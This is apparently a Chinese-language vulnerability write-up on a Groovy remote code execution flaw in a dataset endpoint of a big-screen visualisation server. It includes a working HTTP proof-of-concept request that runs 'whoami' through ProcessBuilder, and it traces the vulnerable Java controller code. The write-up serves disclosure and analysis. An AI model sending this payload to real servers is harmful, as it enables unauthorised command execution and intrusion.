# Groovy-RCE

## 漏洞原理

直接执行客户端传来的`groovy`代码，未经任何过滤

## POC

```http
POST /bigScreenServer/dataset/execute/test HTTP/1.1
Host: 192.168.239.1:8081
Content-Length: 101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Origin: http://192.168.239.1:7521
Referer: http://192.168.239.1:7521/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_0febd9e3cacb3f627ddac64d52caac39=1773910763
Connection: keep-alive

{"script":"new ProcessBuilder(\"whoami\").start().inputStream.text","params":[],"dataSetType":"script"}
```

## 代码

位于`classpath`中`com.gccloud.dataset.controller.DatasetController`

```java
	@ApiOperation("数据集执行测试")
    @PostMapping({"/execute/test"})
    @ApiPermission(
        permissions = {"dataset:execute"}
    )
    public R<Object> execute(@RequestBody TestExecuteDTO executeDTO) {
        if (StringUtils.isBlank(executeDTO.getDataSetType())) {
            return R.error("数据集类型不能为空");
        } else {
            IBaseDataSetService dataSetService = this.dataSetServiceFactory.build(executeDTO.getDataSetType());
            DataVO execute = dataSetService.execute(executeDTO);
            Map<String, Object> result = Maps.newHashMap();
            result.put("data", execute.getData());
            result.put("structure", execute.getStructure());
            if (StringUtils.isNotBlank(executeDTO.getDataSourceId())) {
                DatasourceEntity datasource = this.datasourceService.getInfoById(executeDTO.getDataSourceId());
                if (executeDTO.getDataSetType().equals("original")) {
                    String originalString = executeDTO.getScript();
                    JSONObject originalTest = JSON.parseObject(originalString);
                    String tableName = originalTest.getString("tableName");
                    executeDTO.setScript("select 1 from " + tableName);
                }

                List<String> tableNameList = DBUtils.getTableNames(DBUtils.updateParamsConfig(executeDTO.getScript(), executeDTO.getParams()), datasource.getSourceType());
                result.put("tableNameList", tableNameList);
            }

            return R.success(result);
        }
    }
```

关键代码在这句`DataVO execute = dataSetService.execute(executeDTO);`

经过一系列初始化和调用，最终来到groovy代码执行`script.run();`

```java
public static Object run(String groovyScript, Map<String, Object> params) {
        Class clazz = buildClass(groovyScript);
        if (clazz == null) {
            return null;
        } else {
            Binding binding = new Binding();
            Map variables = binding.getVariables();
            if (params != null) {
                variables.putAll(params);
            }

            try {
                Script script = InvokerHelper.createScript(clazz, binding);
                Object result = script.run();
                return result;
            } catch (Exception var7) {
                log.error(ExceptionUtils.getStackTrace(var7));
                throw new GlobalException("脚本执行失败", var7);
            }
        }
    }
```

